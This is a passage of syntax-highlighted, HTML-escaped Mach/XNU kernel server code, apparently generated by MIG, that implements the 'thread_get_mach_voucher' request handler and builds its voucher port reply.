    &lt;span class=&quot;mi&quot;&gt;2633&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_port_descriptor_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucherTemplate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2634&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* name = */&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2635&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* pad1 = */&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2636&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* pad2 = */&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2637&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* disp = */&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2638&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* type = */&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;MACH_MSG_PORT_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2639&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2640&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* UseStaticTemplates */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2641&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2642&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2643&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;UseStaticTemplates&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2644&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_port_descriptor_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucherTemplate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2645&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* name = */&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2646&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* pad1 = */&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2647&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* pad2 = */&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2648&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* disp = */&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2649&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* type = */&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;MACH_MSG_PORT_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2650&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2651&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* UseStaticTemplates */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2652&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2653&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* __MigKernelSpecificCode */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2654&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2655&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;thread_act_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thr_act&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2656&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2657&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2658&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;__DeclareRcvRpc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3625&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;thread_get_mach_voucher&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2659&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;__BeforeRcvRpc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3625&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;thread_get_mach_voucher&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2660&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2661&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__MIG_check__Request__thread_get_mach_voucher_t__defined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2662&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;check_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__MIG_check__Request__thread_get_mach_voucher_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__Request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2663&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2664&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MIG_RETURN_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2665&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* defined(__MIG_check__Request__thread_get_mach_voucher_t__defined) */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2666&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2667&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;UseStaticTemplates&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2668&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucherTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2669&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* UseStaticTemplates */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2670&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__MigKernelSpecificCode&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2671&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2672&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2673&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2674&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* __MigKernelSpecificCode */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2675&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__LP64__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2676&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pad1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2677&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2678&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pad2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2679&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_PORT_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2680&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2681&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pad_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2682&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2683&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* UseStaticTemplates */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2684&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2685&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2686&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;thr_act&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;convert_port_to_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_request_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2687&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2688&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_get_mach_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thr_act&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;which&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2689&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;thread_deallocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thr_act&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2690&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2691&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;MIG_RETURN_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2692&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2693&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;__MigKernelSpecificCode&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2694&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* __MigKernelSpecificCode */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2695&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;convert_voucher_to_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2696&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2697&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2698&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_COMPLEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2699&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2700&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_descriptor_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2701&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;__AfterRcvRpc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3625&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;thread_get_mach_voucher&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2702&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

